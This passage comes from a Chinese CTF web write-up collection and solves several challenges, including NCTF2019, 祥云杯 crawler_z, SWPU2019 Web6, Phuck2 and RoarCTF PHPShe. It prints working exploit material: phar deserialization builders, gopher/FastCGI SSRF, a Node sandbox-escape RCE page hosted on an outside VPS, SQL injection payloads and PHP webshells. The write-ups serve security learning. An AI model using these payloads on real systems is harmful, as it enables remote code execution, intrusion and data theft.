并且把\u0026lt;x加到body中，就会使第一次的判断中进入异常部分-\u0026gt;pass，不修改isBad的bool值，进入第二次判断后直接拼接filename，读出flag；payload\nGET / POST: filename=../../../flag.txt\u0026amp;amiz=\u0026lt;x 参考：WAF Bypass Techniques - Using HTTP Standard and Web Servers’ Behaviour | wp\nflag{e2c62455-e081-4782-8320-7c76ef570244}\n*[NCTF2019]phar matches everything 给出了源码，直接github.dev看了 这里是url\n两个文件夹分别是两个docker（用dockerfile编排到一起了 ip不同）\nosrc的有80端口暴露在外面，结合页面的交互先看osrc中的catchmine.php和upload.php\nupload.php，可以上传文件\n\u0026lt;?php $target_dir = \u0026#34;uploads/\u0026#34;; $uploadOk = 1; $imageFileType=substr($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;],strrpos($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;],\u0026#39;.\u0026#39;)+1,strlen($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;])); $file_name = md5(time()); $file_name =substr($file_name, 0, 10).\u0026#34;.\u0026#34;.$imageFileType; $target_file=$target_dir.$file_name; $check = getimagesize($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;]); // getimagesize检测文件类型 可触发反序列化 if($check !== false) { echo \u0026#34;File is an image - \u0026#34; . $check[\u0026#34;mime\u0026#34;] . \u0026#34;.\u0026#34;; $uploadOk = 1; } else { echo \u0026#34;File is not an image.\u0026#34;; $uploadOk = 0; } if (file_exists($target_file)) { // 检测同名 当然因为md5的原因也不太能同名 echo \u0026#34;Sorry, file already exists.\u0026#34;; $uploadOk = 0; } if ($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;size\u0026#34;] \u0026gt; 500000) { // 限制大小 echo \u0026#34;Sorry, your file is too large.\u0026#34;; $uploadOk = 0; } if($imageFileType !== \u0026#34;jpg\u0026#34; \u0026amp;\u0026amp; $imageFileType !== \u0026#34;png\u0026#34; \u0026amp;\u0026amp; $imageFileType !== \u0026#34;gif\u0026#34; \u0026amp;\u0026amp; $imageFileType !== \u0026#34;jpeg\u0026#34; ) { // 后缀白名单 echo \u0026#34;Sorry, only jpg,png,gif,jpeg are allowed.\u0026#34;; $uploadOk = 0; } if ($uploadOk == 0) { echo \u0026#34;Sorry, your file was not uploaded.\u0026#34;; } else { if (move_uploaded_file($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target_file)) { echo \u0026#34;The file $file_name has been uploaded to ./uploads/\u0026#34;; // 回显文件路径 } else { echo \u0026#34;Sorry, there was an error uploading your file.\u0026#34;; } } ?\u0026gt; catchmine.php有个反序列化点\n\u0026lt;?php class Easytest{ protected $test; // $test = \u0026#39;1\u0026#39; 注意反序列化产生不可见字符 改成public public function funny_get(){ return $this-\u0026gt;test; } } class Main { public $url; public function curl($url){ // 实现curl操作 $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; } public function __destruct(){ $this_is_a_easy_test=unserialize($_GET[\u0026#39;careful\u0026#39;]); // 反序列化入口 Easytest实例 if($this_is_a_easy_test-\u0026gt;funny_get() === \u0026#39;1\u0026#39;){ echo $this-\u0026gt;curl($this-\u0026gt;url); // 可以访问内网 进行ssrf } } } if(isset($_POST[\u0026#34;submit\u0026#34;])) { $check = getimagesize($_POST[\u0026#39;name\u0026#39;]); // getimagesize检测文件类型 可触发反序列化 if($check !== false) { echo \u0026#34;File is an image - \u0026#34; . $check[\u0026#34;mime\u0026#34;] . \u0026#34;.\u0026#34;; } else { echo \u0026#34;File is not an image.\u0026#34;; } } ?\u0026gt; 这个ssrf肯定就是另一个文件夹里的东西了，正好开着fpm，那就是ssrf打9000端口的fpm了，php.ini中还限制了open_basedir，后面还得饶一下（这是啥套娃题啊，真的套\n害，还得做。先是构造第一个phar，将url设为file:///etc/hosts看内网地址\n\u0026lt;?php class Easytest{ protected $test = \u0026#39;1\u0026#39;; } class Main { public $url = \u0026#39;file:///etc/hosts\u0026#39;; } $c = new Easytest();\t// 注意phar中的是Main 之后再反序列化的是Easytest echo urlencode(serialize($c)); // O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D $a = new Main(); $phar = new Phar(\u0026#34;exp.phar\u0026#34;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#39;); $phar -\u0026gt; setMetadata($a); $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); $phar -\u0026gt; stopBuffering(); 改后缀和MIME上传，拿到路径./uploads/dce6e76f20.jpg，然后到/catchmime.php?careful=处触发，careful参数传入\n这看了个寂寞，寄，直接看/proc/net/arp吧\n尴尬就尴尬在这俩都不是我们直接的ip，想找的靶机就在这个网段里，但是我都加减5位了，都没找到我们的目标靶机…………………………加减5位已经很多了……\n寄。后面的流程我简单说一下吧，懒得本地搭环境，就云了，就是摆。\n首先用p牛那个fpm的脚本构造gopher的payload\npython fpm.py ip \u0026#39;/var/www/html/index.php\u0026#39; -p 9000 -c \u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34; 将生成的payload前面加上gopher://ip:9000/_，放入前面构造phar脚本的url参数中，上传并触发，回显正常\n因为还有disable_functions和open_basedir的存在，所以再绕一下\n\u0026lt;?php mkdir(\u0026#39;/tmp/fuck\u0026#39;);chdir(\u0026#39;/tmp/fuck\u0026#39;);ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/\u0026#39;);print_r(scandir(\u0026#39;/\u0026#39;));readfile(\u0026#39;/flag\u0026#39;);?\u0026gt; // 这里的部分作为fpm.py的参数生成新的gopher payload 再传phar，再触发就能看flag了\n————感想：19年这样的就是难题了，但是放到2021，不对 2022年，这样的题就是纯套娃而不难了，侧面反映ctf真他妈的太卷了，寄\n[2021祥云杯]cralwer_z 唔，我以为我当时打了，但是好像并没有（尴尬\n注册账号登入，只有修改profile一个选项，可以改username, affilication, age, Bucket；看下源码\nindex.js处理/signup, /signin, /logout，user.js处理/user/profile，重点看下这边\nrouter.post(\u0026#39;/profile\u0026#39;, async (req, res, next) =\u0026gt; { let { affiliation, age, bucket } = req.body; const user = await User.findByPk(req.session.userId); if (!affiliation || !age || !bucket || typeof (age) !== \u0026#34;string\u0026#34; || typeof (bucket) !== \u0026#34;string\u0026#34; || typeof (affiliation) != \u0026#34;string\u0026#34;) { return res.render(\u0026#39;user\u0026#39;, { user, error: \u0026#34;Parameters error or blank.\u0026#34; }); } if (!utils.checkBucket(bucket)) { return res.render(\u0026#39;user\u0026#39;, { user, error: \u0026#34;Invalid bucket url.\u0026#34; }); } let authToken; try {\t// 更新内容 await User.update({ affiliation, age, personalBucket: bucket }, { where: { userId: req.session.userId } }); const token = crypto.randomBytes(32).toString(\u0026#39;hex\u0026#39;); authToken = token; await Token.create({ userId: req.session.userId, token, valid: true }); await Token.update({ valid: false, }, { where: { userId: req.session.userId, token: { [Op.not]: authToken } } }); } catch (err) { next(createError(500)); } if (/^https:\\/\\/[a-f0-9]{32}\\.oss-cn-beijing\\.ichunqiu\\.com\\/$/.exec(bucket)) {\t// 对bucket进行正则匹配 符合这个形式 res.redirect(`/user/verify?token=${authToken}`) } else {\t// 匹配失败 // Well, admin won\u0026#39;t do that actually XD. return res.render(\u0026#39;user\u0026#39;, { user: user, message: \u0026#34;Admin will check if your bucket is qualified later.\u0026#34; }); } }); router.get(\u0026#39;/verify\u0026#39;, async (req, res, next) =\u0026gt; { let { token } = req.query; if (!token || typeof (token) !== \u0026#34;string\u0026#34;) { return res.send(\u0026#34;Parameters error\u0026#34;); } let user = await User.findByPk(req.session.userId); const result = await Token.findOne({ token, userId: req.session.userId, valid: true }); if (result) { try { await Token.update({ valid: false }, { where: { userId: req.session.userId } }); await User.update({ bucket: user.personalBucket }, { where: { userId: req.session.userId } }); user = await User.findByPk(req.session.userId); return res.render(\u0026#39;user\u0026#39;, { user, message: \u0026#34;Successfully update your bucket from personal bucket!\u0026#34; }); } catch (err) { next(createError(500)); } } else { user = await User.findByPk(req.session.userId); return res.render(\u0026#39;user\u0026#39;, { user, message: \u0026#34;Failed to update, check your token carefully\u0026#34; }) } }) // Not implemented yet router.get(\u0026#39;/bucket\u0026#39;, async (req, res) =\u0026gt; { const user = await User.findByPk(req.session.userId); if (/^https:\\/\\/[a-f0-9]{32}\\.oss-cn-beijing\\.ichunqiu\\.com\\/$/.exec(user.bucket)) { return res.json({ message: \u0026#34;Sorry but our remote oss server is under maintenance\u0026#34; }); } else {\t// 匹配失败 // Should be a private site for Admin try { const page = new Crawler({ userAgent: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\u0026#39;, referrer: \u0026#39;https://www.ichunqiu.com/\u0026#39;, waitDuration: \u0026#39;3s\u0026#39; }); await page.goto(user.bucket);\t// goto封装了一些页面访问的函数 const html = page.htmlContent; const headers = page.headers; const cookies = page.cookies; await page.close(); // 进行一个页面的访问 返回html headers cookies return res.json({ html, headers, cookies}); } catch (err) { return res.json({ err: \u0026#39;Error visiting your bucket. \u0026#39; }) } } }); 大致审一下，显然最终目标是让bucket成为我们的vps地址让crawler访问\n首先构造一个url通过正则更新profile中的bucket信息，但是别让它重定向（放掉这个包 拿到authtoken），接着到/user/profile重新更新我们的bucket，再放掉之前那个/user/verify，把我们第二次的信息更新了，之后再到/user/bucket就可以访问我们的vps页面了\n那先构造url，这个正则很死\nif (/^https:\\/\\/[a-f0-9]{32}\\.oss-cn-beijing\\.ichunqiu\\.com\\/$/.exec(bucket)) { res.redirect(`/user/verify?token=${authToken}`) } else { // Well, admin won\u0026#39;t do that actually XD. return res.render(\u0026#39;user\u0026#39;, { user: user, message: \u0026#34;Admin will check if your bucket is qualified later.\u0026#34; }); } 但是前面会先过一层这个\nif (!utils.checkBucket(bucket)) { return res.render(\u0026#39;user\u0026#39;, { user, error: \u0026#34;Invalid bucket url.\u0026#34; }); } // utils.js static checkBucket(url) { try { url = new URL(url); } catch (err) { return false; } if (url.protocol != \u0026#34;http:\u0026#34; \u0026amp;\u0026amp; url.protocol != \u0026#34;https:\u0026#34;) return false; if (url.href.includes(\u0026#39;oss-cn-beijing.ichunqiu.com\u0026#39;) === false) return false; return true; } 这个很好绕，不影响后面的；接下来就是构造evil.html了，利用crawler.js所用zombie库的漏洞，具体漏洞分析参见-\u0026gt;Nodejs Zoombie Package RCE 分析\n// crawler.js goto(url) { return new Promise((resolve, reject) =\u0026gt; { try { this.crawler.visit(url, () =\u0026gt; { const resource = this.crawler.resources.length ? this.crawler.resources.filter(resource =\u0026gt; resource.response).shift() : null; this.statusCode = resource.response.status this.headers = this.getHeaders(); this.cookies = this.getCookies(); this.htmlContent = this.getHtmlContent(); resolve(); }); } catch (err) { reject(err.message); } }) } payload如下\nbucket url\nhttp://101.35.114.107:2301/craw.html?oss-cn-beijing.ichunqiu.com/ craw.html\n\u0026lt;script\u0026gt; a=this.constructor.constructor.constructor.constructor(\u0026#39;return process\u0026#39;)();b=a.mainModule.require(\u0026#39;child_process\u0026#39;);c=b.execSync(\u0026#39;cat /flag\u0026#39;).toString();document.write(c); \u0026lt;/script\u0026gt; flag{bdb5a23f-1436-4b83-9ad9-0a889d34b1f4}\n[SWPU2019]Web6 一个登录页面\n这sql语句都写脸上了，但是原谅我老菜鸡，自己没试出来\nusername=1\u0026#39;or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; group by passwd with rollup having passwd is NULL#\u0026amp;passwd= 之前真没见过这种注入方式…… 查了wp后知道这是实验吧3.因缺思汀的绕过，那道题的源码如下\n\u0026lt;?php error_reporting(0); if (!isset($_POST[\u0026#39;uname\u0026#39;]) || !isset($_POST[\u0026#39;pwd\u0026#39;])) { // 两个参数 echo \u0026#39;\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;input name=\u0026#34;uname\u0026#34; type=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;input name=\u0026#34;pwd\u0026#34; type=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;/form\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;!--source: source.txt--\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(\u0026#34;/\u0026#34;.$ArrReq.\u0026#34;/is\u0026#34;,$StrValue)==1){ print \u0026#34;水可载舟，亦可赛艇！\u0026#34;; exit(); } } $filter = \u0026#34;and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\u0026#34;; foreach($_POST as $key=\u0026gt;$value){ AttackFilter($key,$value,$filter); // 过滤字符 } $con = mysql_connect(\u0026#34;XXXXXX\u0026#34;,\u0026#34;XXXXXX\u0026#34;,\u0026#34;XXXXXX\u0026#34;); if (!$con){ die(\u0026#39;Could not connect: \u0026#39; . mysql_error()); } $db=\u0026#34;XXXXXX\u0026#34;; mysql_select_db($db, $con); $sql=\u0026#34;SELECT * FROM interest WHERE uname = \u0026#39;{$_POST[\u0026#39;uname\u0026#39;]}\u0026#39;\u0026#34;; // uname可控 $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { // 如果只查出来一行数据 $key = mysql_fetch_array($query); if($key[\u0026#39;pwd\u0026#39;] == $_POST[\u0026#39;pwd\u0026#39;]) { // 比对passwd print \u0026#34;CTF{XXXXXX}\u0026#34;; }else{ print \u0026#34;亦可赛艇！\u0026#34;; } }else{ // 数据多于一行 print \u0026#34;一颗赛艇！\u0026#34;; } mysql_close($con); ?\u0026gt; 分析写进去了，它有一个数据是否为1行的判断，说明用户不止一个，我们可以用limit 1 offset x来判断人数；第三个过滤需要输入的密码和数据库中的相同，可以使用group by pwd with rollup语句，分组后会多一行统计，在group分组字段的基础上再统计数据，会出现这样的效果\n会出现一个NULL（最后的总数据还会多一个NULL），感觉很类似联合查询的时候凭空多一组数据；我们就需要这个pass=null的数据，用having passwd is NULL；以下是本题的payload\n1\u0026#39;or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; group by passwd with rollup having passwd is NULL# 空密码即可成功登入\n扫目录有一个wsdl.php，看到了熟悉的SoapClient，还提示了这些\nService.php和Interface.php都读不到，那只能读剩下的一些method了，接在/index.php?method=后面看看\n还有/index.php?method=get_flag\n再结合上面的SoapClient，肯定是要反序列化SoapClient+SSRF了\n还有/index.php?method=File_read，可以接一个POST参数filename，我们读一下源码\nindex.php\n\u0026lt;?php ob_start(); include (\u0026#34;encode.php\u0026#34;); include(\u0026#34;Service.php\u0026#34;); //error_reporting(0); //phpinfo(); $method = $_GET[\u0026#39;method\u0026#39;]?$_GET[\u0026#39;method\u0026#39;]:\u0026#39;index\u0026#39;; //echo 1231; $allow_method = array(\u0026#34;File_read\u0026#34;,\u0026#34;login\u0026#34;,\u0026#34;index\u0026#34;,\u0026#34;hint\u0026#34;,\u0026#34;user\u0026#34;,\u0026#34;get_flag\u0026#34;); if(!in_array($method,$allow_method)) { die(\u0026#34;not allow method\u0026#34;); } if($method===\u0026#34;File_read\u0026#34;) { $param =$_POST[\u0026#39;filename\u0026#39;]; $param2=null; }else { if($method===\u0026#34;login\u0026#34;) { $param=$_POST[\u0026#39;username\u0026#39;]; $param2 = $_POST[\u0026#39;passwd\u0026#39;]; }else { echo \u0026#34;method can use\u0026#34;; } } echo $method; $newclass = new Service(); echo $newclass-\u0026gt;$method($param,$param2); ob_flush(); ?\u0026gt; 读一下Service.php没权限，读encode.php\n\u0026lt;?php function en_crypt($content,$key){ $key = md5($key); $h = 0; $length = strlen($content); $swpuctf = strlen($key); $varch = \u0026#39;\u0026#39;; for ($j = 0; $j \u0026lt; $length; $j++) { if ($h == $swpuctf) { $h = 0; } $varch .= $key{$h}; $h++; } $swpu = \u0026#39;\u0026#39;; for ($j = 0; $j \u0026lt; $length; $j++) { $swpu .= chr(ord($content{$j}) + (ord($varch{$j})) % 256); } return base64_encode($swpu); } 有个Key，我们读keyaaaaaaaasdfsaf.txt得到flag{this_is_false_flag}，应该这个就是key；搞一个对应的解密脚本\n\u0026lt;?php function de_crypt($swpu,$key){ $swpu=base64_decode($swpu); $key=md5($key); $h=0; $length=strlen($swpu); $swpuctf=strlen($key); $varch=\u0026#39;\u0026#39;; for($j=0;$j\u0026lt;$length;$j++){ if($h==$swpuctf) { $h=0; } $varch.=$key{$h}; $h++; } $content=\u0026#39;\u0026#39;; for($j=0;$j\u0026lt;$length;$j++) { $content.= chr(ord($swpu{$j}) - (ord($varch{$j}))+256 % 256); } return $content; } 注意到我们访问的时候cookie会有一个user字段\n用上面那个解密脚本进行解密\nprint (de_crypt(\u0026#34;3J6Roahxag==\u0026#34;, \u0026#34;flag{this_is_false_flag}\u0026#34;)); // xiaoC:2 我们伪造一个admin:1重新加密回去，得到xZmdm9NxaQ==，用File_read读一下前面提到的se.php，好家伙，果然反序列化，而且是结合了SoapClient和session\n\u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); class aa { public $mod1; public $mod2; // $cc public function __call($name,$param) { if($this-\u0026gt;{$name}) { $s1 = $this-\u0026gt;{$name}; $s1(); // $cc-\u0026gt;__invoke } } public function __get($ke) { return $this-\u0026gt;mod2[$ke]; } } class bb { public $mod1; // $aa public $mod2; public function __destruct() { $this-\u0026gt;mod1-\u0026gt;test2(); // $aa-\u0026gt;__call } } class cc { public $mod1; // $ee public $mod2; public $mod3; public function __invoke() { $this-\u0026gt;mod2 = $this-\u0026gt;mod3.$this-\u0026gt;mod1; // $ee-\u0026gt;__toString } } class dd { public $name; public $flag; public $b; // public function getflag() { session_start(); var_dump($_SESSION); $a = array(reset($_SESSION),$this-\u0026gt;flag);\t// 注意这里的session echo call_user_func($this-\u0026gt;b,$a); } } class ee { public $str1; // $dd public $str2; // \u0026#39;getflag\u0026#39; public function __toString() { $this-\u0026gt;str1-\u0026gt;{$this-\u0026gt;str2}(); // $dd-\u0026gt;getflag return \u0026#34;1\u0026#34;; } } $bb = new bb(); $aa = new aa(); $cc = new cc(); $ee = new ee(); $bb -\u0026gt;mod1 = $aa; $cc -\u0026gt; mod1 = $ee; $dd = new dd(); $dd-\u0026gt;flag=\u0026#39;Get_flag\u0026#39;; $dd-\u0026gt;b=\u0026#39;call_user_func\u0026#39;; $ee -\u0026gt; str1 = $dd; $ee -\u0026gt; str2 = \u0026#34;getflag\u0026#34;; $aa -\u0026gt;mod2[\u0026#39;test2\u0026#39;] = $cc; echo serialize($bb); interface.php\n\u0026lt;?php include(\u0026#39;Service.php\u0026#39;); $ser = new SoapServer(\u0026#39;Service.wsdl\u0026#39;,array(\u0026#39;soap_version\u0026#39;=\u0026gt;SOAP_1_2)); $ser-\u0026gt;setClass(\u0026#39;Service\u0026#39;); $ser-\u0026gt;handle(); ?\u0026gt; 整体的思路大概是，通过文件上传把一个我们构造好的恶意SoapClient的序列化字符串写入sess_2333这个session文件中，然后利用se.php的反序列化功能，调用到call_user_func的时候就会把session中的SOAP类的Get_flag给调用出来，call_user_func('call_user_func', array($session, 'Get_flag'));\n——————但是这里就有个问题，怎么能确定我们ssrf打的interface.php就有Get_flag方法呢？为什么不打ssrf的/index.php?method=get_flag呢？出题人说那个不输出结果，多做了个soap接口interface.php来攻击\n首先是这个SoapClient\n\u0026lt;?php $target = \u0026#39;http://127.0.0.1/interface.php\u0026#39;; $headers = array( \u0026#39;X-Forwarded-For: 127.0.0.1\u0026#39;, \u0026#39;Cookie: user=xZmdm9NxaQ==\u0026#39;, ); $b = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target,\u0026#39;user_agent\u0026#39;=\u0026gt;\u0026#39;amiz^^Content-Type: application/x-www-form-urlencoded^^\u0026#39;.join(\u0026#39;^^\u0026#39;,$headers),\u0026#39;uri\u0026#39; =\u0026gt; \u0026#34;amiz\u0026#34;)); $a = serialize($b); $a = str_replace(\u0026#39;^^\u0026#39;,\u0026#34;\\r\\n\u0026#34;,$a); echo $a; ?\u0026gt; // O:10:\u0026#34;SoapClient\u0026#34;:5:{s:3:\u0026#34;uri\u0026#34;;s:4:\u0026#34;amiz\u0026#34;;s:8:\u0026#34;location\u0026#34;;s:30:\u0026#34;http://127.0.0.1/interface.php\u0026#34;;s:15:\u0026#34;_stream_context\u0026#34;;i:0;s:11:\u0026#34;_user_agent\u0026#34;;s:108:\u0026#34;amiz Content-Type: application/x-www-form-urlencoded X-Forwarded-For: 127.0.0.1 Cookie: user=xZmdm9NxaQ==\u0026#34;;s:13:\u0026#34;_soap_version\u0026#34;;i:1;} 传上去，记得改PHPSESSID\n然后到/se.php，POST方式传入aa=pop链结果\n参考：wp | wp2\n[Insomni hack teaser 2019]Phuck2 \u0026lt;?php stream_wrapper_unregister(\u0026#39;php\u0026#39;); // 不太懂？ if(isset($_GET[\u0026#39;hl\u0026#39;])) highlight_file(__FILE__); $mkdir = function($dir) { system(\u0026#39;mkdir -- \u0026#39;.escapeshellarg($dir)); // 定义函数$mkdir() 调用系统函数mkdir }; $randFolder = bin2hex(random_bytes(16)); // 随机字符串 $mkdir(\u0026#39;users/\u0026#39;.$randFolder); // 当前目录下创建子目录users/randFolder chdir(\u0026#39;users/\u0026#39;.$randFolder); $userFolder = (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]) ? $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;] : $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); // 可以自定义存储路径 $userFolder = basename(str_replace([\u0026#39;.\u0026#39;,\u0026#39;-\u0026#39;],[\u0026#39;\u0026#39;,\u0026#39;\u0026#39;],$userFolder)); // 替换`.`和`-` $mkdir($userFolder); // 创建子目录并转到子目录中 chdir($userFolder); file_put_contents(\u0026#39;profile\u0026#39;,print_r($_SERVER,true)); // 写入内容 文件名为profile chdir(\u0026#39;..\u0026#39;); // 回到users/randFolder $_GET[\u0026#39;page\u0026#39;]=str_replace(\u0026#39;.\u0026#39;,\u0026#39;\u0026#39;,$_GET[\u0026#39;page\u0026#39;]); // 过滤`.` if(!stripos(file_get_contents($_GET[\u0026#39;page\u0026#39;]),\u0026#39;\u0026lt;?\u0026#39;) \u0026amp;\u0026amp; !stripos(file_get_contents($_GET[\u0026#39;page\u0026#39;]),\u0026#39;php\u0026#39;)) {\t// 文件内容不能有\u0026lt;?和php include($_GET[\u0026#39;page\u0026#39;]); // 文件包含点 } chdir(__DIR__); // 回到当前目录 system(\u0026#39;rm -rf users/\u0026#39;.$randFolder); // 删除users/randFolder及其子目录 ?\u0026gt; 自己第一遍看的时候没明白第一句啥意思，原来第一句的意思是ban了php流，确实挺狠的；亮点有几个，首先是调用系统级的mkdir和rm命令，就非常有可以绕过的空间（但最后考的地方也不在这），另外那个file_put_contents文件的内容我们可控，因为是整个$_SERVER数组（可以把我们的代码写到任意http请求头中），还有后面的include文件包含点不允许内容有\u0026lt;?和php（需要绕过这个检测）；据说后面有phpinfo.php的提示说allow_url_fopen=On allow_url_include=Off\n这里利用的点是include与file_get_contents在处理Data URI上的问题。他们都支持data:text/vnd-example+xyz;foo=bar;base64,R0lGODdh这样的内容（而不是data://流！），还比如data:image/jpeg;base64,xxx这样的图片等等，但是有一些问题，file_get_contents允许使用data URI，会直接返回后面的内容，当allow_url_include=Off情况下不允许include data URI，但如果当data:,xxx是一个目录名的话就会放开这个限制（返回xxx 而不是文件内容）\n只要把xff头改为我们想要的文件名，然后随便一个参数包含我们的恶意代码（在$_SERVERS数组中），再让page参数设为data:amiz/profile，做到file_get_contents不认 但是include认，可以让它直接包含这个文件\n参考：wp\n[网鼎杯 2020 总决赛]Game Exp 给了源码，非常多，结合页面功能看代码；首先是注册，有个很奇怪的单独的类\n很显然需要一个反序列化点触发AnyClass的eval()，结合注册地方上传文件的地方+file_exists函数，很显然是phar反序列化了，而phar本来就对后缀名不敏感（主要看内容），所以直接用phar.jpg即可，$filename是拼接的用户名和后缀\nexp.php\n\u0026lt;?php class AnyClass{ var $output = \u0026#39;echo \u0026#34;ok\u0026#34;;\u0026#39;; function __destruct() { eval($this -\u0026gt; output); } } $c = new AnyClass(); $c -\u0026gt; output = \u0026#39;system($_GET[1]);\u0026#39;;\t// 注意这里是单引号 echo serialize($c); $phar = new Phar(\u0026#34;exp.phar\u0026#34;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#39;); $phar -\u0026gt; setMetadata($c); $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); $phar -\u0026gt; stopBuffering(); 修改后缀和MIME上传，路径是/login/amiz.jpg（是用户名\n再回到注册上传那里，修改用户名为php://amiz，然后GET参数触发shell即可\n[RoarCTF 2019]PHPShe 附件里有.idea，给了一些提示，是1.7版本的phpshe，有两个已知的cve，不过xxe那个因为不存在对应的php文件，所以用sql那个cve-2019-9762，下面跟一下分析的过程\n在include/function/global.func.php下有针对数据库安全的函数pe_dbhold()\n参数会被addslashes处理，我们的引号和反斜杠不保，那看看有没有不用引号也可以注入的地方或者是宽字节注入\n在include/plugin/payment/alipay/pay.php中对$order_id参数进行了这样的处理\n其中奇奇怪怪的$_g_id是对post参数的重命名，在common.php中\n用到了extract对变量名前面加上_g_或_p_的前缀\n回到上面，get方式传入的id参数先经过pe_dbhold处理后赋值给$order_id，随后进入order_table函数，位于hook/order.hook.php\n如果传入的参数含有_，则会以它为分隔符，返回order_+_前的第一部分，如果参数不含_直接返回order\n再回到前面的pe_select，位于include/class/db.class.php\n这不巧了，参数部分用的是反引号而不是单引号，传入的$order_id就是这里的$table部分，dbpre是数据库表前缀；构造这样的payload\npay` where 1=1 and sleep(5)%23_ 经过order_table和pe_select之后是这样的语句\nselect * from `order_pay` where 1=1 and sleep(5)#` where `order_id` = `pay` where 1=1 and sleep(5)#_ limit 1 然后找利用点，在include/plugin/payment/alipay/pay.php中有利用点并且有回显位；因为对_的特殊处理，我们无法用information_schema来查表，所以只能在不知道列名的情况下注入\nselect`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1 构造payload\nGET /include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_ 得到admin密码的md5值，查一下得到altman777，在/admin.php处登入后台\n首先在品牌管理处可以上传文件\n借助.idea给出的提示，在include/class/pclzip.class.php有个比官方文件多出来的__destruct\n还有自带的__construct\n还有个打开的module/admin/moban.php和include/function/global.func.php，在down操作中实例化上面的PclZip类，之后用extract()来解压zip文件，$moban_template是文件路径\n在del操作中调用pe_dirdel\n有个is_file($dir_path)可以触发反序列化\n结合上面的__destruct中的extract，肯定是phar反序列化了，在前面上传的地方上传压缩过的webshell，然后再传入phar，里面参数的路径指向前面的zip路径，被反序列化后触发__destruct 解压zip到一个可读写目录/var/www/html/data中\n\u0026lt;?php eval($_POST[\u0026#39;amiz\u0026#39;]);?\u0026gt; http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/1.zip\n\u0026lt;?php class PclZip{ var $zipname = \u0026#39;\u0026#39;; var $zip_fd = 0; var $error_code = 1; var $error_string = \u0026#39;\u0026#39;; var $magic_quotes_status; var $save_path = \u0026#39;/var/www/html/data\u0026#39;;//解压目录 function __construct($p_zipname){ $this-\u0026gt;zipname = $p_zipname; $this-\u0026gt;zip_fd = 0; $this-\u0026gt;magic_quotes_status = -1; return; } } $a=new PclZip(\u0026#34;/var/www/html/data/attachment/brand/1.zip\u0026#34;);//压缩的文件路径 echo serialize($a); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;m0c1nu7\u0026#34;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/data/attachment/brand/2.txt\n之后触发phar反序列化\nGET 